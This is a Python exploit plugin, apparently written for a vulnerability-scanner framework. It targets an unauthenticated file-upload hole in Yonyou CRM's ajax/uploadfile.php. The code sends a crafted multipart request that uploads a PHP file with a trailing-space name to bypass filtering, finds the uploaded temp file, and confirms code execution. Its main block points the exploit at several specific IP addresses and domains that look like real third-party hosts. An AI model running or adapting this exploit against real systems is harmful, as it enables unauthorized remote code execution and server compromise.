#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = yougyou_crm_getshell
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0136925

import random
import re

def assign(service, arg):
    if service == 'yongyou_crm':
        return True, arg

def audit(arg):
    shellName = ""
    for i in range(16):
        shellName += chr(ord('a')+random.randint(0,25))
    payload = "ajax/uploadfile.php?DontCheckLogin=1"
    raw = """
POST ajax/uploadfile.php?DontCheckLogin=1 HTTP/1.1
Host: 111.207.244.5:8888
Content-Length: 312
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0

------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="upload"

upload
------WebKitFormBoundaryAVuAKsvesmnWtgEP--

""" % shellName
    code, head, res, err, _ = curl.curl2(arg+payload, raw=raw)
    reRes = re.findall("(\w+.tmp.php)", res)
    if reRes:
        code, head, res, err, _ = curl.curl2(arg+"tmpfile/"+reRes[0])
        if 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(arg+payload+" ---> "+arg+"tmpfile/"+reRes[0]+" : file upload / get shell")

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_crm','http://180.169.30.13:2046/')[1])
    audit(assign('yongyou_crm','http://112.64.196.14/')[1])
    audit(assign('yongyou_crm','http://111.207.244.5:8888/')[1])
    audit(assign('yongyou_crm','http://qinyuancrm.com/')[1])
    audit(assign('yongyou_crm','http://crm.elfa.com.cn/')[1])